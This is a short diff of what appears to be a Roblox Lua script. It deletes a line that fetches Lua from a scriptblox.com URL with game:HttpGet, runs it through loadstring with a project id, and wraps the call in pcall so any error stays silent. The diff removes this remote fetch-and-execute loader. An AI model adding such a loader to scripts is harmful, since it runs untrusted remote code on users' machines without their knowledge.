@@ -1,4 +1,4 @@
-pcall(function() loadstring(game:HttpGet("https://scriptblox.com/ingest/clientv2.lua"))("proj_397b295693ca", "1.0.0", false) end)
+
 
 if not game:IsLoaded() then
 	game.Loaded:Wait()
